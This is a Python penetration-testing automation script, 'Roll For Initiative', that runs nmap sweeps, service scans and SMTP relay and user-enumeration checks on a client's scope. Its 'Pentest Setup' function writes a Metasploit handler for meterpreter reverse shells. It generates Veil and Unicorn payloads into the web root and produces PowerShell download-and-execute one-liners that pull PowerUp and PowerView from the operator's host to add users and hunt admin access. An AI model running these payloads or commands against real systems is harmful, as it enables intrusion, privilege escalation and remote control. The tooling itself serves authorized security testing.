#!/usr/bin/python
# Andrew Luke @sw4mp_f0x
# ToDo:
#   Standalone scan option for at least ping sweep.
#   Check for live-hosts before ping-sweep and ask if you still want to run.
#
#
# Todo:
# - Add ssh and telnet brute forcing
# - Add NFSulator
# - Implement new webinterface tool
# - Automate excludes checking
# -


import sys
import subprocess
import os
import logging
import shutil


def setup():
    # Check for client folder. Create if it does not exist
    clients_path = "/root/Clients/"
    if not os.path.exists(clients_path):
        os.makedirs(clients_path)
    Client = raw_input("Client name: ")
    global client_folder
    client_folder = clients_path + Client + "/"
    if not os.path.exists(client_folder):
        os.makedirs(client_folder)


    #Check for required files
    while not os.path.exists(client_folder + "scope.txt"):
        create_scope = raw_input(
            "A list of IP addresses or IP ranges needs to be definied within %s. Hit enter when completed..." % (
                client_folder + "scope.txt"))
    while not os.path.exists(client_folder + "excludes.txt"):
        create_scope = raw_input(
            "A list of IP addresses or IP ranges needs to be definied within %s, even if it is empty. Hit enter when completed..." % (
                client_folder + "excludes.txt"))

    log_file = raw_input("Define log file location:[%s] " % (client_folder + Client + ".log"))
    if not log_file:
        log_file = client_folder + Client + ".log"
    logging.basicConfig(filename=log_file, format='%(asctime)s %(message)s', level=logging.INFO,
                        datefmt='%m/%d/%Y %I:%M:%S %p -')


def execute(selection):
    options = {"1": kickoff,
               "2": web_interfaces,
               "3": service_scan,
               "4": pentest_setup
               }
    options[selection]()


def kickoff():
    # Ping-Sweep
    print "===================================="
    print "Beginning Kickoff Scan"
    print "===================================="
    logging.info("Beginning Ping Sweep")
    ping_sweep = subprocess.Popen([
        'nmap -sn -v10 -T4 --open -iL %sscope.txt --excludefile %sexcludes.txt -oG %sping-sweep --stats-every 1m' % (
            client_folder, client_folder, client_folder)], shell=True)
    ping_sweep.wait()
    logging.info("Ping Sweep Complete")
    file_to_parse = open('%sping-sweep' % (client_folder))
    export_file = open('%slive-hosts.txt' % (client_folder), 'wb')
    for line in file_to_parse:
        if "Up" in line:
            export_file.write('%s\n' % (line.split()[1]))
    file_to_parse.close()
    export_file.close()

    livehosts = open('%slive-hosts.txt' % (client_folder))
    for host in livehosts:
        global LiveHostCount
        LiveHostCount += 1
    export_file.close()

    # Check for exclusions within live-hosts
    print "\n\nRFI found %s live hosts on the network." % (LiveHostCount)
    check = raw_input("Check that the exclusions were actually excluded and then press [Enter] to continue...")

    # Targetted Port Scans
    print "===================================="
    print "Beginning Targetted Service Scans"
    print "===================================="

    logging.info("Beginning Targeted Port Scan")
    ports = ["22", "23", "53", "389", "686", "2049", "5800,5900-5920", "5985", "10000"]
    ports_NSE = ["445", "21", "25", "1433", "3306", "80"]

    for port in ports:
        logging.info("Scanning port %s." % (port))
        targetted_ports = subprocess.Popen([
            'nmap -Pn -n -p%s -sV --open -oA %s%s -v10 --stats-every 1m -iL %slive-hosts.txt' % (
                port, client_folder, port, client_folder)], shell=True)
        targetted_ports.wait()

    for port in ports_NSE:
        logging.info("Scanning port %s." % (port))
        targetted_ports_with_NSE = subprocess.Popen([
            'nmap -Pn -n -p%s -sV -sC --open -oA %s%s -v10 --stats-every 1m -iL %slive-hosts.txt' % (
                port, client_folder, port, client_folder)], shell=True)
        targetted_ports_with_NSE.wait()

    logging.info("Targeted Port Scan Complete")

    if not os.path.exists(client_folder + "Finals"):
        os.makedirs(client_folder + "Finals")

    file_to_parse = open('%s23.gnmap' % (client_folder))
    export_file = open('%sFinals/TelnetList.txt' % (client_folder), 'wb')
    for line in file_to_parse:
        if "telnet?" not in line and "print" not in line and "JetDirect" not in line and "#" not in line and "tcpwrapped" not in line and "Ricoh" not in line and "Up" not in line and "APC" not in line and "Pocket" not in line:
            export_file.write('%s\n' % (line.split()[1]))
    file_to_parse.close()
    export_file.close()

    file_to_parse = open('%s445.gnmap' % (client_folder))
    export_file = open('%s445.txt' % (client_folder), 'wb')
    for line in file_to_parse:
        if "Up" in line:
            export_file.write('%s\n' % (line.split()[1]))
    file_to_parse.close()
    export_file.close()


    print "===================================="
    print "Beginning SMTP Open Relay"
    print "and Enumeration NSE scripts"
    print "===================================="
    file_to_parse = open('%s25.gnmap' % (client_folder))
    export_file = open('%ssmtprelay.txt' % (client_folder), 'wb')
    for line in file_to_parse:
        if "telnet?" not in line and "print" not in line and "JetDirect" not in line and "#" not in line and "tcpwrapped" not in line and "Ricoh" not in line and "Up" not in line and "APC" not in line and "Pocket" not in line:
            export_file.write('%s\n' % (line.split()[1]))
    file_to_parse.close()
    export_file.close()

    logging.info("Checking for open relays")
    open_relay = subprocess.Popen([
        'nmap -Pn --script smtp-open-relay.nse -p 25,465,587 --open -iL %ssmtprelay.txt -oA %sFinals/SMTP_Relay' % (
            client_folder, client_folder)], shell=True)
    open_relay.wait()
    logging.info("Open relay check complete")

    logging.info("Checking for SMTP enum")
    open_relay = subprocess.Popen([
        'nmap -Pn --script smtp-enum-users.nse -p 25,465,587 --open -iL %ssmtprelay.txt -oA %sFinals/SMTP_Enum' % (
            client_folder, client_folder)], shell=True)
    open_relay.wait()
    logging.info("SMTP enum check complete")
    os.remove("%ssmtprelay.txt" % (client_folder))

    global message
    message = "Kickoff scans complete"


def web_interfaces():
    print "===================================="
    print "Beginning Rawr Scan"
    print "===================================="
    logging.info("Starting Nmap web scan")
    web_scan = subprocess.Popen([
        'nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,7000,7001,7002,8000,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8443,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL %slive-hosts.txt -oA %sweb' % (
            client_folder, client_folder)], shell=True)
    web_scan.wait()
    logging.info("Nmap web scan complete")

    logging.info("Starting Rawr")
    rawr_proc = subprocess.Popen(["python %s -f %sweb.xml -d %s" % (rawr_folder, client_folder, client_folder)],
                                 shell=True)
    rawr_proc.wait()
    logging.info("Rawr complete")

    global message
    message = "Rawr complete"


def service_scan():
    print "===================================="
    print "Beginning Service Scan"
    print "===================================="
    logging.info("Starting service scan")
    service_scan = subprocess.Popen(
        ['nmap -sV --open -iL %slive-hosts.txt -v10 -T4 -oA %ssvc-scan' % (client_folder, client_folder)], shell=True)
    service_scan.wait()
    logging.info("Service scan complete")

    global message
    message = "Service scan complete"


def pentest_setup():
    import boost
    print "===================================="
    print "Setting up pentest files"
    print "===================================="
    ip = raw_input("Enter LHOST> ")
    bounce = open('/bounce', "w")
    bounce.write('''use exploit/multi/handler
                    jobs -K
                    set payload windows/meterpreter/reverse_tcp
                    set exitonsession false
                    set lport 53
                    set enablestageencoding true
                    set autorunscript migrate -f
                    set LHOST %s
                    exploit -j -z
                    set payload windows/meterpreter/reverse_https
                    set lport 443
                    exploit -j -z''' % (ip))

    bool = False
    while not bool:
        kali2 = raw_input("Are you using Kali 2? [y/n]: ")
        global cmd_path
        if kali2 is "n":
            cmd_path = "/var/www/cmd.html"
            bool = True
        elif kali2 is "y":
            cmd_path = "/var/www/html/cmd.html"
            bool = True

    cmd_html = ('''<b>Invoke-AllChecks</b><p><p>
                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-Allchecks"
                <p><p>
                <b>Write-UserAddServiceBinary</b><p><p>
                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Write-UserAddServiceBinary -ServiceName SQLRODBC"
                <p><p>
                <b>Invoke-ServiceUserAdd</b><p><p>
                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/PowerUp.ps1'); Invoke-ServiceUserAdd -ServiceName spooler"
                <p><p>
                <b>Invoke-FindLocalAdminAccess</b><p><p>
                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-FindLocalAdminAccess"
                <p><p>
                <b>Invoke-userhunter</b><p><p>
                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-userhunter"
                <p><p>
                <b>Invoke-ShareFinder</b><p><p>
                powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://%s:8080/powerview.ps1'); Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii found_shares.txt"''' % (
        ip, ip, ip, ip, ip, ip))

    cmd_file = open(cmd_path, "w")
    cmd_file.write(cmd_html)
    cmd_file.close()

    # Deleting old files
    if os.path.exists("/root/HTTPS_443r.exe"):
        os.remove("/root/HTTPS_443r.exe")
    if os.path.exists("/root/TCP_53r.exe"):
        os.remove("/root/TCP_53r.exe")
    if os.path.exists("/root/power443.txt"):
        os.remove("/root/power443.txt")
    if os.path.exists("/root/power53.txt"):
        os.remove("/root/power53.txt")
    if os.path.exists("/var/www/html/HTTPS_443.exe"):
        os.remove("/var/www/html/HTTPS_443.exe")
    if os.path.exists("/var/www/html/TCP_53.exe"):
        os.remove("/var/www/html/TCP_53.exe")
    if os.path.exists("/var/www/html/power443.txt"):
        os.remove("/var/www/html/power443.txt")
    if os.path.exists("/var/www/html/power53.txt"):
        os.remove("/var/www/html/power53.txt")


    # Build Veil Payloads
    TCPport = raw_input("Define TCP listening port:[53] ")
    if not TCPport:
        TCPport = '53'
    HTTPSport = raw_input("Define HTTPS listening port:[443] ")
    if not HTTPSport:
        HTTPSport = '443'
    payload_type = raw_input("Define payload type (python, ruby, both): ")
    payload_paths = []
    devnull = open('/dev/null', 'w')
    if payload_type == "both":
        payload_paths.append(boost.BuildVeilTCP(ip, TCPport, 'Veil_TCP_' + TCPport, lang='ruby', pwnstaller=True, overwrite=True))
        payload_paths.append(boost.BuildVeilTCP(ip, TCPport, 'Veil_TCP_' + TCPport, lang='python', pwnstaller=True, overwrite=True))
        payload_paths.append(boost.BuildVeilHTTPS(ip, HTTPSport, 'Veil_HTTPS_' + HTTPSport, lang='ruby', pwnstaller=True, overwrite=True))
        payload_paths.append(boost.BuildVeilHTTPS(ip, HTTPSport, 'Veil_HTTPS_' + HTTPSport, lang='python', pwnstaller=True, overwrite=True))
    elif payload_type == "python":
        payload_paths.append(boost.BuildVeilTCP(ip, TCPport, 'Veil_TCP_' + TCPport, lang='python', pwnstaller=True, overwrite=True))
        payload_paths.append(boost.BuildVeilHTTPS(ip, HTTPSport, 'Veil_HTTPS_' + HTTPSport, lang='python', pwnstaller=True, overwrite=True))
    elif payload_type == "ruby":
        payload_paths.append(boost.BuildVeilTCP(ip, TCPport, 'Veil_TCP_' + TCPport, lang='ruby', pwnstaller=True, overwrite=False, stdout=devnull, stderr=devnull))
        payload_paths.append(boost.BuildVeilHTTPS(ip, HTTPSport, 'Veil_HTTPS_' + HTTPSport, lang='ruby', pwnstaller=True, overwrite=False, stdout=devnull, stderr=devnull))

    for path in payload_paths:
        shutil.copyfile(path, "/root/%s" % (path.split('/')[-1]))
        shutil.copyfile(path, "/var/www/html/%s" % (path.split('/')[-1]))

    # Build Unicorn Powershell HTTPS payload
    unicorn_https = subprocess.Popen(
        ['python /root/tools/unicorn/unicorn.py windows/meterpreter/reverse_https %s %s' % (ip, HTTPSport)], shell=True)
    unicorn_https.wait()
    shutil.copyfile("./powershell_attack.txt", "/root/Powershell_HTTPS_%s.txt" % (HTTPSport))
    shutil.copyfile("./powershell_attack.txt", "/var/www/html/Powershell_HTTPS_%s.txt" % (HTTPSport))
    update_cmd = open(cmd_path, "a")
    open_payload = open("./powershell_attack.txt", "r")
    unicorn_https_payload = open_payload.readlines()
    update_cmd.write('''<p><p>
                        <b>Powershell HTTPS Payload</b><p><p>
                        %s''' % (unicorn_https_payload[0]))
    open_payload.close()

    # Build Unicorn Powershell HTTPS payload
    unicorn_tcp = subprocess.Popen(
        ['python /root/tools/unicorn/unicorn.py windows/meterpreter/reverse_tcp %s %s' % (ip, TCPport)], shell=True)
    unicorn_tcp.wait()
    shutil.copyfile("./powershell_attack.txt", "/root/Powershell_TCP_%s.txt" % (TCPport))
    shutil.copyfile("./powershell_attack.txt", "/var/www/html/Powershell_TCP_%s.txt" % (TCPport))
    open_payload = open("./powershell_attack.txt", "r")
    unicorn_tcp_payload = open_payload.readlines()
    update_cmd.write('''<p><p>
                        <b>Powershell TCP Payload</b><p><p>
                        %s''' % (unicorn_tcp_payload[0]))
    update_cmd.close()
    open_payload.close()
    os.remove("./powershell_attack.txt")
    os.remove("./unicorn.rc")

    global message
    message = "Pentest setup complete"


def ssh_telnet_brute():
    logging.info("Scanning port %s." % (port))
    targetted_ports = subprocess.Popen([
        'nmap -Pn -n -p%s -sV --open -oA %s%s -v10 --stats-every 1m -iL %slive-hosts.txt' % (
            port, client_folder, port, client_folder)], shell=True)
    targetted_ports.wait()


def main_menu(check=""):
    try:
        print("==========================================================")
        print("Roll For Initiative")
        print("By: @Sw4mp_f0x")
        print("==========================================================")
        print("")

        # Check for message, print message if present, clear out message
        if check:
            print(check)
            print("")
        global message
        message = ""

        print("Roll For Initiative Options:")
        print(" [1] Kickoff Scans")
        print(" [2] Web Interface Scan + Rawr")
        print(" [3] Nmap Service Scan")
        print(" [4] Pentest Setup")
        print("")
        selection = raw_input("Please select an option: ")
        if 1 <= int(selection) <= 5:
            execute(selection)
        else:
            raise ValueError('A very specific bad thing happened')
    except ValueError:
        unused_var = os.system("clear")
        main_menu("Invalid entry. Pick again.")



if __name__ == "__main__":
    LiveHostCount = 0
    rawr_folder = "/root/tools/rawr/rawr.py"
    global cmd_path
    cmd_path = ""
    global message
    message = ""
    setup()
    
    try:
        while True:
            main_menu(message)
            unused_var = os.system("clear")
    except KeyboardInterrupt:
        print("Later!")

